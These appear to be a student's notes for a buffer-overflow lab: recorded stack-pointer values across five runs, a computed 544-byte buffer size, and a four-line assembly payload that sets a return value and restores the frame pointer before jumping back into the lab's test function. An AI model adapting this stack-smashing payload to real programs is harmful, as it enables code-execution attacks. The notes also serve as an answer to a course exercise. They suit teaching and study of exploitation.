# find all 5 rbp/rsp values: 
    # rbp: 0x55782fe0, rsp: 0x55782fc0 // return 5578
    # rbp: 0x55782f70, rsp: 0x55782f50 // return 5578
    # rbp: 0x55782f60, rsp: 0x55782f40 // return 5578
    # rbp: 0x55783040, rsp: 0x55783020 // return 5578 
    # rbp: 0x55782ff0, rsp: 0x55782fd0 // return 5578
# find size of buffer: 544 - getbufn 220 in decimal is 544  

exploit:
    push $0x401385 # put us back in test_exploitn
    mov $0x622524ed,%rax
    lea 0x20(%rsp),%rbp # offset of 20 rsp into rbp to restore canary 
    ret
